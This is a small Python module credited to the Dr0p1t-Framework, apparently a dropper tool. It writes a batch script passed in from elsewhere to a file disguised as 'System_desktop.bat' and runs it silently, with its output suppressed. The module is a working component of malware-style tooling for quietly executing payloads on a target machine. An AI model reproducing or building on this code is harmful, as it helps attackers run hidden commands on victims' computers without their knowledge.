#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This module aims to run batchfile scripts (bat)
#Start

def create_and_run_bat(tobe):
    import os
    f = open("System_desktop.bat","w")
    f.write(tobe)
    f.close()
    blah = os.popen( "System_desktop.bat > nul" )

create_and_run_bat(Bat_Script_Data)
